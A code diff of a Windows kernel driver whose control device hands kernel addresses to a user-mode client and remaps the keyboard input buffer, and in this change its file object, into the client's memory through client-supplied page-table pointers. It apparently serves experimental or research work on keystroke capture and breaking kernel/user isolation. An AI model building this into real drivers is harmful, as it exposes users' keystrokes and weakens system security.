@@ -7,7 +7,8 @@
 
 WDFDEVICE ControlDevice;
 extern PKEYBOARD_INPUT_DATA keyboardBuffer;
-
+extern PFILE_OBJECT keyboardBufferFileObject;
+extern VOID pauseForABit(CSHORT secondsDelay);
 
 
 /*
@@ -83,7 +84,6 @@ NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING Regis
 		KdPrint(("WdfDeviceInitAssignName Succeeded\n"));
 	}
 
-	//WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
 	status = WdfDeviceCreate(&ControlDeviceInit, &ControlDeviceAttributes, &ControlDevice);
 	if (!NT_SUCCESS(status)) {
 		KdPrint(("WdfDeviceCreate FAILED 0x%lx\n", status));
@@ -128,14 +128,10 @@ VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {
 	KdPrint(("ReadKeyboardBuffer IRQ Level [%u]\n", KeGetCurrentIrql()));
 
 	NTSTATUS                  status;
-	//	WDF_REQUEST_PARAMETERS    params;
 	WDFMEMORY memoryHandle;
-	//PVOID memoryPointer;
 	size_t Length;
 	size_t memoryLength;
 
-	//WDF_REQUEST_PARAMETERS_INIT(&params);
-	//WdfRequestGetParameters(Request, &params);
 	if (keyboardBuffer) {
 
 
@@ -169,18 +165,22 @@ VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {
 			if (instruction) {
 				KdPrint(("ReadKeyboardBuffer Client instruction is [%c]\n", instruction));
 				if (instruction == 'O') {
-					INDEX kmdfOffset = (INDEX)keyboardBuffer & 0x0fff;
-					KdPrint(("Sending address [0x%lx] offset [0x%lx] to user\n", (ULONG)keyboardBuffer, kmdfOffset));
+					//ULONG kmdfOffset = (ULONG)keyboardBuffer & 0x0fff;
+					//KdPrint(("Sending keyboardBuffer address [0x%lx] offset [0x%lx] to user\n", (ULONG)keyboardBuffer, kmdfOffset));
+					ULONG kmdfOffset = (ULONG)keyboardBufferFileObject & 0x0fff;
+					KdPrint(("Sending keyboardBufferFileObject address [0x%lx] offset [0x%lx] to user\n", (ULONG)keyboardBufferFileObject, kmdfOffset));
 					userSharedMemory->offset = kmdfOffset;
 					status = STATUS_SUCCESS;
 				}
 				else if (instruction == 'E') {
-					GENERIC_POINTER  clientMemory = userSharedMemory->ClientMemory;
+					PVOID  clientMemory = userSharedMemory->ClientMemory;
 					PPDE clientPpde = (PPDE)userSharedMemory->PageDirectory;
 					PPTE clientPpte = (PPTE)userSharedMemory->PageTable;
 					KdPrint(("ReadKeyboardBuffer usermem is  [0x%lx] Page Directory is [0x%lx] Page Table is [0x%lx]\n", clientMemory, clientPpde, clientPpte));
 
-					status = Remap(clientMemory, clientPpde, clientPpte, keyboardBuffer);
+					pauseForABit(5);
+					//status = Remap(clientMemory, clientPpde, clientPpte, keyboardBuffer);
+					status = Remap(clientMemory, clientPpde, clientPpte, keyboardBufferFileObject);
 					WdfRequestComplete(Request, status);
 					return;
 				}
@@ -198,8 +198,6 @@ VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {
 	}
 	// Set transfer information
 	KdPrint(("ReadKeyboardBuffer returning to user length [%u] status [0x%lx]\n", Length, status));
-//	WdfRequestSetInformation(Request, &Length);
-//	WdfRequestComplete(Request, status);
 	WdfRequestCompleteWithInformation(Request, status, &Length);
 	return;
 
